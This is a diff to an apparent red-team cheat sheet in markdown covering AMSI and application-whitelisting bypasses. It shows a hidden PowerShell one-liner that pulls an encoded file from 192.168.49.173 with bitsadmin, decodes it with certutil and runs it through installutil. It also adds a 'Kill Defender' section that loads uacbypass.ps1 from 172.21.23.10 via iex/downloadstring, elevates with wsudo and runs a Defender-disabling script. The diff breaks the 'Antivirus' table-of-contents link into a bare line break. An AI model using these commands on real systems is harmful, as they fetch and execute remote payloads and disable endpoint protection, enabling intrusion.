@@ -34,7 +34,8 @@ Enjoy.
         - [Sharploader](#sharploader)
         - [Load Assembly](#load-assembly)
         - [Covert & Change passwd](#covert--change-passwd)
-- [Antivirus](#antivirus)
+- [
+](#antivirus)
     - [AMSI](#amsi)
         - [CLM](#clm)
         - [Java](#java)
@@ -245,6 +246,15 @@ $ExecutionContext.SessionState.LanguageMode
 
 ```powershell
 powershell -windowstyle hidden bitsadmin /Transfer newjob3 http://192.168.49.173/enc3.txt c:\\windows\\temp\\enc3.txt;certutil -decode c:\\windows\\temp\\enc3.txt c:\\windows\\temp\\bypass.exe;C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\installutil.exe /logfile= /LogToConsole=false /U C:\\windows\\temp\\bypass.exe
+```
+
+##### Kill Defender
+
+```powershell
+iex(new-object net.webclient).downloadstring('http://172.21.23.10/uacbypass.ps1');alt
+.\wsudo -T powershell
+.\fuckdefender.ps1
+reboot
 ```
 
 ##### Java
